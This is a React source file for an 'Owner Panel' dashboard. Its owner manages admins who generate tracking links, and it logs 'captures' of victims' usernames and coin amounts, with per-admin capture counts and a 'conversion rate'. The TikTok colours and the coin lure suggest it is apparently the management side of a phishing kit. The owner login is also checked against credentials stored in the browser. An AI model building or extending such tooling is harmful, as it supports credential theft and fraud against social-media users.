import { useState, useEffect, useCallback } from 'react'
import { useNavigate } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Crown, LogOut, Users, Link2, Activity, ShieldCheck,
  Plus, Trash2, Copy, Check, Eye, BarChart3, Globe,
  TrendingUp, Clock, AlertTriangle, Search,
  X, Radio, UserPlus,
  KeyRound, AtSign, Coins, ExternalLink
} from 'lucide-react'
import {
  OWNER_CREDENTIALS,
  isOwnerLoggedIn,
  setOwnerSession,
  clearOwnerSession,
  getOwnerStats,
  addAdmin,
  deleteAdmin,
  getAllLinks,
  subscribeToStorageChanges,
  type Admin,
} from '../lib/storage'

type TabType = 'dashboard' | 'admins' | 'links' | 'activity'

export default function OwnerPanel() {
  const navigate = useNavigate()
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [loginForm, setLoginForm] = useState({ username: '', password: '' })
  const [loginError, setLoginError] = useState(false)
  const [activeTab, setActiveTab] = useState<TabType>('dashboard')
  const [stats, setStats] = useState({
    totalAdmins: 0,
    totalLinks: 0,
    totalCaptures: 0,
    adminDetails: [] as (Admin & { linkCount: number; captureCount: number })[],
  })
  const [newAdminForm, setNewAdminForm] = useState({ username: '', password: '' })
  const [showAddForm, setShowAddForm] = useState(false)
  const [addError, setAddError] = useState('')
  const [copiedLink, setCopiedLink] = useState<string | null>(null)
  const [searchTerm, setSearchTerm] = useState('')
  const [showShake, setShowShake] = useState(false)
  const [currentTime, setCurrentTime] = useState(new Date())

  // Check session
  useEffect(() => {
    if (isOwnerLoggedIn()) {
      setIsLoggedIn(true)
    }
  }, [])

  // Clock
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000)
    return () => clearInterval(timer)
  }, [])

  // Load stats
  const loadStats = useCallback(() => {
    setStats(getOwnerStats())
  }, [])

  useEffect(() => {
    if (isLoggedIn) {
      loadStats()
      const unsub = subscribeToStorageChanges(loadStats)
      const interval = setInterval(loadStats, 2000)
      return () => {
        unsub()
        clearInterval(interval)
      }
    }
  }, [isLoggedIn, loadStats])

  const handleLogin = () => {
    if (!loginForm.username || !loginForm.password) {
      setShowShake(true)
      setTimeout(() => setShowShake(false), 500)
      return
    }
    if (
      loginForm.username === OWNER_CREDENTIALS.username &&
      loginForm.password === OWNER_CREDENTIALS.password
    ) {
      setOwnerSession()
      setIsLoggedIn(true)
      setLoginError(false)
    } else {
      setLoginError(true)
      setShowShake(true)
      setTimeout(() => setShowShake(false), 500)
    }
  }

  const handleLogout = () => {
    clearOwnerSession()
    setIsLoggedIn(false)
    navigate('/')
  }

  const handleAddAdmin = () => {
    if (!newAdminForm.username.trim() || !newAdminForm.password.trim()) {
      setAddError('Please fill in all fields')
      return
    }
    const success = addAdmin({
      id: `admin_${Date.now()}`,
      username: newAdminForm.username.trim(),
      password: newAdminForm.password.trim(),
      createdAt: new Date().toISOString(),
    })
    if (success) {
      setNewAdminForm({ username: '', password: '' })
      setShowAddForm(false)
      setAddError('')
      loadStats()
    } else {
      setAddError('Username already exists')
    }
  }

  const handleDeleteAdmin = (id: string) => {
    if (window.confirm('Are you sure? This will delete all their links and captures!')) {
      deleteAdmin(id)
      loadStats()
    }
  }

  const copyToClipboard = (url: string, linkId: string) => {
    navigator.clipboard.writeText(url)
    setCopiedLink(linkId)
    setTimeout(() => setCopiedLink(null), 2000)
  }

  const allLinks = getAllLinks()
  const filteredLinks = allLinks.filter(l =>
    l.adminName.toLowerCase().includes(searchTerm.toLowerCase()) ||
    l.slug.toLowerCase().includes(searchTerm.toLowerCase())
  )

  // Login Screen
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0f0f0f] flex items-center justify-center p-4 relative overflow-hidden">
        {/* Animated background elements */}
        <div className="absolute inset-0 pointer-events-none">
          <motion.div
            animate={{ x: [0, 30, 0], y: [0, -20, 0] }}
            transition={{ duration: 8, repeat: Infinity, ease: 'easeInOut' }}
            className="absolute top-[10%] left-[10%] w-[300px] h-[300px] rounded-full bg-pink-500/5 blur-[120px]"
          />
          <motion.div
            animate={{ x: [0, -20, 0], y: [0, 30, 0] }}
            transition={{ duration: 10, repeat: Infinity, ease: 'easeInOut' }}
            className="absolute bottom-[10%] right-[10%] w-[300px] h-[300px] rounded-full bg-cyan-400/5 blur-[120px]"
          />
          <motion.div
            animate={{ scale: [1, 1.2, 1] }}
            transition={{ duration: 6, repeat: Infinity, ease: 'easeInOut' }}
            className="absolute top-[40%] left-[50%] w-[200px] h-[200px] rounded-full bg-purple-500/5 blur-[100px]"
          />
        </div>

        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className={`relative w-full max-w-md ${showShake ? 'animate-shake' : ''}`}
        >
          {/* Glowing border effect */}
          <div className="absolute -inset-0.5 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 rounded-2xl opacity-20 blur-sm" />

          <div className="relative bg-[#1a1a1a] border border-[#2c2c2c] rounded-2xl p-8">
            <motion.div
              initial={{ y: -20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.1 }}
              className="text-center mb-8"
            >
              <motion.div
                animate={{ rotate: [0, 5, -5, 0] }}
                transition={{ duration: 4, repeat: Infinity }}
                className="w-20 h-20 rounded-2xl bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 flex items-center justify-center mx-auto mb-4 shadow-lg shadow-pink-500/20"
              >
                <Crown className="w-10 h-10 text-white" />
              </motion.div>
              <h1 className="text-2xl font-bold gradient-text">Owner Control</h1>
              <p className="text-sm text-gray-500 mt-1">Restricted access only</p>
            </motion.div>

            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.2 }}
              className="space-y-4"
            >
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">Username</label>
                <div className="relative">
                  <AtSign className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-600" />
                  <input
                    type="text"
                    value={loginForm.username}
                    onChange={(e) => setLoginForm({ ...loginForm, username: e.target.value })}
                    onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                    placeholder="Enter owner username"
                    className="w-full h-12 bg-[#0f0f0f] border border-[#2c2c2c] rounded-xl pl-12 pr-4 text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55] transition-all"
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">Password</label>
                <div className="relative">
                  <KeyRound className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-600" />
                  <input
                    type="password"
                    value={loginForm.password}
                    onChange={(e) => setLoginForm({ ...loginForm, password: e.target.value })}
                    onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                    placeholder="Enter owner password"
                    className="w-full h-12 bg-[#0f0f0f] border border-[#2c2c2c] rounded-xl pl-12 pr-4 text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55] transition-all"
                  />
                </div>
              </div>

              <AnimatePresence>
                {loginError && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    exit={{ opacity: 0, height: 0 }}
                    className="flex items-center gap-2 text-red-400 text-sm bg-red-500/10 rounded-lg p-3"
                  >
                    <AlertTriangle className="w-4 h-4" />
                    Invalid credentials. Access denied.
                  </motion.div>
                )}
              </AnimatePresence>

              <motion.button
                whileHover={{ scale: 1.02, boxShadow: '0 0 20px rgba(254, 44, 85, 0.3)' }}
                whileTap={{ scale: 0.98 }}
                onClick={handleLogin}
                className="w-full h-12 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 rounded-xl font-semibold text-white transition-all"
              >
                Access Control Panel
              </motion.button>
            </motion.div>
          </div>
        </motion.div>
      </div>
    )
  }

  // Main Owner Dashboard
  return (
    <div className="min-h-screen bg-[#0f0f0f] text-white">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-black/80 backdrop-blur-md border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <motion.div
              animate={{ rotate: [0, 5, -5, 0] }}
              transition={{ duration: 4, repeat: Infinity }}
              className="w-10 h-10 rounded-xl bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 flex items-center justify-center"
            >
              <Crown className="w-5 h-5 text-white" />
            </motion.div>
            <div>
              <h1 className="text-sm font-bold gradient-text">Owner Panel</h1>
              <p className="text-xs text-gray-500 flex items-center gap-1">
                <Radio className="w-3 h-3 text-green-400" />
                Live Monitoring
              </p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="hidden md:flex items-center gap-2 text-xs text-gray-500">
              <Clock className="w-3.5 h-3.5" />
              {currentTime.toLocaleString()}
            </div>
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={handleLogout}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all text-sm"
            >
              <LogOut className="w-4 h-4" />
              Logout
            </motion.button>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-6">
        {/* Stats Overview */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
          {[
            {
              label: 'Total Admins',
              value: stats.totalAdmins,
              icon: ShieldCheck,
              color: 'from-pink-500 to-rose-600',
              delay: 0,
            },
            {
              label: 'Total Links',
              value: stats.totalLinks,
              icon: Link2,
              color: 'from-cyan-400 to-teal-500',
              delay: 0.1,
            },
            {
              label: 'Total Captures',
              value: stats.totalCaptures,
              icon: Users,
              color: 'from-purple-500 to-indigo-600',
              delay: 0.2,
            },
            {
              label: 'System Status',
              value: 'Active',
              icon: Activity,
              color: 'from-emerald-400 to-green-500',
              delay: 0.3,
            },
          ].map((stat) => {
            const Icon = stat.icon
            return (
              <motion.div
                key={stat.label}
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: stat.delay }}
                className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-5 relative overflow-hidden"
              >
                <div className="absolute top-0 right-0 w-20 h-20 bg-gradient-to-r opacity-10 rounded-bl-full" style={{ background: `linear-gradient(135deg, ${stat.color.includes('pink') ? '#fe2c55' : stat.color.includes('cyan') ? '#25f4ee' : stat.color.includes('purple') ? '#8b5cf6' : '#10b981'}, transparent)` }} />
                <div className="flex items-center justify-between relative z-10">
                  <div>
                    <p className="text-sm text-gray-500">{stat.label}</p>
                    <motion.p
                      key={typeof stat.value === 'number' ? stat.value : undefined}
                      initial={{ scale: 1.2 }}
                      animate={{ scale: 1 }}
                      className="text-2xl font-bold text-white mt-1"
                    >
                      {stat.value}
                    </motion.p>
                  </div>
                  <div className={`w-12 h-12 rounded-xl bg-gradient-to-r ${stat.color} flex items-center justify-center`}>
                    <Icon className="w-6 h-6 text-white" />
                  </div>
                </div>
              </motion.div>
            )
          })}
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-6 overflow-x-auto pb-2">
          {([
            { id: 'dashboard', label: 'Dashboard', icon: BarChart3 },
            { id: 'admins', label: 'Admins', icon: ShieldCheck },
            { id: 'links', label: 'All Links', icon: Link2 },
            { id: 'activity', label: 'Live Activity', icon: Radio },
          ] as const).map((tab) => {
            const Icon = tab.icon
            const isActive = activeTab === tab.id
            return (
              <motion.button
                key={tab.id}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-sm font-medium transition-all whitespace-nowrap ${
                  isActive
                    ? 'bg-gradient-to-r from-pink-500 to-rose-600 text-white'
                    : 'bg-[#1a1a1a] text-gray-400 hover:text-white border border-[#2c2c2c]'
                }`}
              >
                <Icon className="w-4 h-4" />
                {tab.label}
              </motion.button>
            )
          })}
        </div>

        {/* Tab Content */}
        <AnimatePresence mode="wait">
          {activeTab === 'dashboard' && (
            <motion.div
              key="dashboard"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-6"
            >
              {/* Quick Actions */}
              <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6">
                <h3 className="text-lg font-semibold text-white mb-4">Quick Actions</h3>
                <div className="flex flex-wrap gap-3">
                  <motion.button
                    whileHover={{ scale: 1.03 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => { setActiveTab('admins'); setShowAddForm(true) }}
                    className="btn-3d flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-pink-500 to-rose-600 rounded-xl font-medium text-white shadow-lg shadow-pink-500/25"
                  >
                    <UserPlus className="w-5 h-5" />
                    Add New Admin
                  </motion.button>
                  <motion.button
                    whileHover={{ scale: 1.03 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => setActiveTab('links')}
                    className="flex items-center gap-2 px-6 py-3 bg-[#252525] border border-[#2c2c2c] rounded-xl font-medium text-gray-300 hover:text-white transition-all"
                  >
                    <Link2 className="w-5 h-5" />
                    View All Links
                  </motion.button>
                  <motion.button
                    whileHover={{ scale: 1.03 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => setActiveTab('activity')}
                    className="flex items-center gap-2 px-6 py-3 bg-[#252525] border border-[#2c2c2c] rounded-xl font-medium text-gray-300 hover:text-white transition-all"
                  >
                    <Radio className="w-5 h-5" />
                    Live Activity
                  </motion.button>
                </div>
              </div>

              {/* Admin Performance */}
              <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6">
                <h3 className="text-lg font-semibold text-white mb-4">Admin Performance</h3>
                {stats.adminDetails.length === 0 ? (
                  <div className="text-center py-8 text-gray-600">
                    <ShieldCheck className="w-12 h-12 mx-auto mb-3 opacity-50" />
                    <p>No admins created yet.</p>
                  </div>
                ) : (
                  <div className="space-y-4">
                    {stats.adminDetails.map((admin, i) => (
                      <motion.div
                        key={admin.id}
                        initial={{ x: -20, opacity: 0 }}
                        animate={{ x: 0, opacity: 1 }}
                        transition={{ delay: i * 0.05 }}
                        className="flex items-center gap-4 p-4 rounded-xl bg-[#0f0f0f] border border-[#2c2c2c]"
                      >
                        <div className="w-12 h-12 rounded-xl bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center flex-shrink-0">
                          <ShieldCheck className="w-6 h-6 text-white" />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2">
                            <p className="text-sm font-semibold text-white">{admin.username}</p>
                            <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-green-500/20 text-green-400">Active</span>
                          </div>
                          <div className="flex items-center gap-4 mt-1 text-xs text-gray-500">
                            <span className="flex items-center gap-1">
                              <Link2 className="w-3 h-3" />
                              {admin.linkCount} links
                            </span>
                            <span className="flex items-center gap-1">
                              <Users className="w-3 h-3" />
                              {admin.captureCount} captures
                            </span>
                            <span className="flex items-center gap-1">
                              <Clock className="w-3 h-3" />
                              {new Date(admin.createdAt).toLocaleDateString()}
                            </span>
                          </div>
                        </div>
                        <div className="flex-shrink-0">
                          <motion.button
                            whileHover={{ scale: 1.1 }}
                            whileTap={{ scale: 0.9 }}
                            onClick={() => navigate(`/admin/${admin.id}`)}
                            className="p-2 rounded-lg bg-[#252525] text-gray-400 hover:text-white transition-all"
                          >
                            <Eye className="w-4 h-4" />
                          </motion.button>
                        </div>
                      </motion.div>
                    ))}
                  </div>
                )}
              </div>

              {/* Live Metrics */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <motion.div
                  initial={{ y: 20, opacity: 0 }}
                  animate={{ y: 0, opacity: 1 }}
                  transition={{ delay: 0.3 }}
                  className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6"
                >
                  <div className="flex items-center gap-2 mb-4">
                    <TrendingUp className="w-5 h-5 text-cyan-400" />
                    <h3 className="font-semibold text-white">Conversion Rate</h3>
                  </div>
                  <div className="flex items-end gap-2">
                    <span className="text-4xl font-bold text-white">
                      {stats.totalLinks > 0 ? Math.round((stats.totalCaptures / stats.totalLinks) * 100) : 0}
                    </span>
                    <span className="text-lg text-gray-500 mb-1">%</span>
                  </div>
                  <p className="text-xs text-gray-500 mt-2">Captures per link ratio</p>
                  {/* Mini bar chart */}
                  <div className="flex items-end gap-1 mt-4 h-16">
                    {[40, 65, 45, 80, 55, 70, 90, 60, 75, 85].map((h, i) => (
                      <motion.div
                        key={i}
                        initial={{ height: 0 }}
                        animate={{ height: `${h}%` }}
                        transition={{ delay: i * 0.05 + 0.5 }}
                        className="flex-1 rounded-t bg-gradient-to-t from-pink-500/50 to-pink-500/20"
                      />
                    ))}
                  </div>
                </motion.div>

                <motion.div
                  initial={{ y: 20, opacity: 0 }}
                  animate={{ y: 0, opacity: 1 }}
                  transition={{ delay: 0.4 }}
                  className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6"
                >
                  <div className="flex items-center gap-2 mb-4">
                    <Globe className="w-5 h-5 text-purple-400" />
                    <h3 className="font-semibold text-white">System Health</h3>
                  </div>
                  <div className="space-y-3">
                    {[
                      { label: 'Storage', value: 75, color: 'from-pink-500 to-rose-600' },
                      { label: 'Database', value: 92, color: 'from-cyan-400 to-teal-500' },
                      { label: 'API Status', value: 98, color: 'from-emerald-400 to-green-500' },
                      { label: 'Security', value: 100, color: 'from-purple-500 to-indigo-600' },
                    ].map((item) => (
                      <div key={item.label}>
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-xs text-gray-400">{item.label}</span>
                          <span className="text-xs text-white font-medium">{item.value}%</span>
                        </div>
                        <div className="w-full h-2 bg-[#0f0f0f] rounded-full overflow-hidden">
                          <motion.div
                            initial={{ width: 0 }}
                            animate={{ width: `${item.value}%` }}
                            transition={{ duration: 1, delay: 0.5 }}
                            className={`h-full rounded-full bg-gradient-to-r ${item.color}`}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                </motion.div>
              </div>
            </motion.div>
          )}

          {activeTab === 'admins' && (
            <motion.div
              key="admins"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold text-white">Admin Management</h3>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => setShowAddForm(!showAddForm)}
                  className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-pink-500 to-rose-600 rounded-lg text-sm font-medium text-white"
                >
                  {showAddForm ? <X className="w-4 h-4" /> : <Plus className="w-4 h-4" />}
                  {showAddForm ? 'Cancel' : 'Add Admin'}
                </motion.button>
              </div>

              {/* Add Admin Form */}
              <AnimatePresence>
                {showAddForm && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: 'auto', opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    className="overflow-hidden mb-6"
                  >
                    <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-6">
                      <h4 className="text-sm font-medium text-white mb-4">Create New Admin</h4>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                        <div>
                          <label className="block text-xs text-gray-500 mb-2">Username</label>
                          <div className="relative">
                            <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600" />
                            <input
                              type="text"
                              value={newAdminForm.username}
                              onChange={(e) => setNewAdminForm({ ...newAdminForm, username: e.target.value })}
                              placeholder="Enter admin username"
                              className="w-full h-10 bg-[#0f0f0f] border border-[#2c2c2c] rounded-lg pl-10 pr-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55]"
                            />
                          </div>
                        </div>
                        <div>
                          <label className="block text-xs text-gray-500 mb-2">Password</label>
                          <div className="relative">
                            <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600" />
                            <input
                              type="text"
                              value={newAdminForm.password}
                              onChange={(e) => setNewAdminForm({ ...newAdminForm, password: e.target.value })}
                              placeholder="Enter admin password"
                              className="w-full h-10 bg-[#0f0f0f] border border-[#2c2c2c] rounded-lg pl-10 pr-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55]"
                            />
                          </div>
                        </div>
                      </div>
                      {addError && (
                        <div className="flex items-center gap-2 text-red-400 text-xs bg-red-500/10 rounded-lg p-2 mb-4">
                          <AlertTriangle className="w-3 h-3" />
                          {addError}
                        </div>
                      )}
                      <motion.button
                        whileHover={{ scale: 1.02 }}
                        whileTap={{ scale: 0.98 }}
                        onClick={handleAddAdmin}
                        className="px-6 py-2 bg-gradient-to-r from-pink-500 to-rose-600 rounded-lg text-sm font-medium text-white"
                      >
                        Create Admin
                      </motion.button>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              {/* Admin List */}
              {stats.adminDetails.length === 0 ? (
                <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-8 text-center">
                  <ShieldCheck className="w-12 h-12 mx-auto mb-3 text-gray-600" />
                  <p className="text-gray-500">No admins yet.</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {stats.adminDetails.map((admin, i) => (
                    <motion.div
                      key={admin.id}
                      initial={{ y: 20, opacity: 0 }}
                      animate={{ y: 0, opacity: 1 }}
                      transition={{ delay: i * 0.05 }}
                      className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl overflow-hidden"
                    >
                      <div className="p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-3">
                            <div className="w-12 h-12 rounded-xl bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center">
                              <ShieldCheck className="w-6 h-6 text-white" />
                            </div>
                            <div>
                              <div className="flex items-center gap-2">
                                <p className="text-sm font-semibold text-white">{admin.username}</p>
                                <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-green-500/20 text-green-400">Active</span>
                              </div>
                              <p className="text-xs text-gray-500">ID: {admin.id}</p>
                            </div>
                          </div>
                          <div className="flex items-center gap-2">
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.9 }}
                              onClick={() => navigate(`/admin/${admin.id}`)}
                              className="p-2 rounded-lg bg-[#252525] text-gray-400 hover:text-white transition-all"
                            >
                              <Eye className="w-4 h-4" />
                            </motion.button>
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.9 }}
                              onClick={() => handleDeleteAdmin(admin.id)}
                              className="p-2 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all"
                            >
                              <Trash2 className="w-4 h-4" />
                            </motion.button>
                          </div>
                        </div>

                        <div className="flex items-center gap-6 text-xs text-gray-500">
                          <span className="flex items-center gap-1">
                            <Link2 className="w-3 h-3" />
                            {admin.linkCount} links generated
                          </span>
                          <span className="flex items-center gap-1">
                            <Users className="w-3 h-3" />
                            {admin.captureCount} captures
                          </span>
                          <span className="flex items-center gap-1">
                            <Clock className="w-3 h-3" />
                            Created {new Date(admin.createdAt).toLocaleDateString()}
                          </span>
                        </div>
                      </div>
                    </motion.div>
                  ))}
                </div>
              )}
            </motion.div>
          )}

          {activeTab === 'links' && (
            <motion.div
              key="links"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold text-white">All Generated Links</h3>
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input
                    type="text"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    placeholder="Search links..."
                    className="h-9 bg-[#1a1a1a] border border-[#2c2c2c] rounded-lg pl-10 pr-4 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55]"
                  />
                </div>
              </div>

              {filteredLinks.length === 0 ? (
                <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-8 text-center">
                  <Link2 className="w-12 h-12 mx-auto mb-3 text-gray-600" />
                  <p className="text-gray-500">
                    {searchTerm ? 'No links match your search.' : 'No links generated yet.'}
                  </p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead>
                      <tr className="text-left text-xs text-gray-500 border-b border-[#2c2c2c]">
                        <th className="pb-3 px-4">Admin</th>
                        <th className="pb-3 px-4">Slug</th>
                        <th className="pb-3 px-4">Captures</th>
                        <th className="pb-3 px-4">Created</th>
                        <th className="pb-3 px-4">Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredLinks.map((link, i) => (
                        <motion.tr
                          key={link.id}
                          initial={{ x: -10, opacity: 0 }}
                          animate={{ x: 0, opacity: 1 }}
                          transition={{ delay: i * 0.03 }}
                          className="border-b border-[#1f1f1f] hover:bg-[#1e1e1e] transition-colors"
                        >
                          <td className="py-3 px-4">
                            <div className="flex items-center gap-2">
                              <div className="w-8 h-8 rounded-full bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center">
                                <ShieldCheck className="w-4 h-4 text-white" />
                              </div>
                              <span className="text-sm text-white">{link.adminName}</span>
                            </div>
                          </td>
                          <td className="py-3 px-4">
                            <code className="text-xs text-cyan-400">{link.slug}</code>
                          </td>
                          <td className="py-3 px-4">
                            <span className="flex items-center gap-1 text-sm text-gray-300">
                              <Users className="w-3.5 h-3.5" />
                              {link.captures.length}
                            </span>
                          </td>
                          <td className="py-3 px-4 text-xs text-gray-500">
                            {new Date(link.createdAt).toLocaleString()}
                          </td>
                          <td className="py-3 px-4">
                            <div className="flex items-center gap-1">
                              <motion.button
                                whileHover={{ scale: 1.1 }}
                                whileTap={{ scale: 0.9 }}
                                onClick={() => copyToClipboard(link.url, link.id)}
                                className="p-1.5 rounded-lg bg-[#252525] text-gray-400 hover:text-white transition-all"
                              >
                                {copiedLink === link.id ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                              </motion.button>
                              <motion.button
                                whileHover={{ scale: 1.1 }}
                                whileTap={{ scale: 0.9 }}
                                onClick={() => window.open(link.url, '_blank')}
                                className="p-1.5 rounded-lg bg-[#252525] text-gray-400 hover:text-white transition-all"
                              >
                                <ExternalLink className="w-3.5 h-3.5" />
                              </motion.button>
                            </div>
                          </td>
                        </motion.tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </motion.div>
          )}

          {activeTab === 'activity' && (
            <motion.div
              key="activity"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold text-white">Live Activity Feed</h3>
                <div className="flex items-center gap-2 text-xs text-green-400">
                  <motion.div
                    animate={{ scale: [1, 1.2, 1] }}
                    transition={{ duration: 1, repeat: Infinity }}
                    className="w-2 h-2 rounded-full bg-green-400"
                  />
                  Live
                </div>
              </div>

              {allLinks.flatMap(l => l.captures).length === 0 ? (
                <div className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-8 text-center">
                  <Radio className="w-12 h-12 mx-auto mb-3 text-gray-600" />
                  <p className="text-gray-500">No activity recorded yet.</p>
                </div>
              ) : (
                <div className="space-y-3">
                  {allLinks
                    .flatMap(l => l.captures.map(c => ({ ...c, adminName: l.adminName, slug: l.slug })))
                    .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
                    .map((cap, i) => (
                      <motion.div
                        key={cap.id}
                        initial={{ x: -20, opacity: 0 }}
                        animate={{ x: 0, opacity: 1 }}
                        transition={{ delay: i * 0.03 }}
                        className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-4"
                      >
                        <div className="flex items-center gap-4">
                          <div className="w-10 h-10 rounded-full bg-gradient-to-r from-pink-500 to-rose-600 flex items-center justify-center flex-shrink-0">
                            <Users className="w-5 h-5 text-white" />
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <span className="text-sm font-medium text-white">@{cap.username}</span>
                              <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-yellow-500/20 text-yellow-400">{cap.status}</span>
                            </div>
                            <div className="flex items-center gap-3 text-xs text-gray-500">
                              <span className="flex items-center gap-1">
                                <Coins className="w-3 h-3" />
                                {cap.coinAmount.toLocaleString()} coins
                              </span>
                              <span className="flex items-center gap-1">
                                <ShieldCheck className="w-3 h-3" />
                                {cap.adminName}
                              </span>
                              <span className="flex items-center gap-1">
                                <Link2 className="w-3 h-3" />
                                {cap.slug}
                              </span>
                            </div>
                          </div>
                          <div className="flex-shrink-0 text-xs text-gray-600">
                            {new Date(cap.timestamp).toLocaleTimeString()}
                          </div>
                        </div>
                      </motion.div>
                    ))}
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  )
}
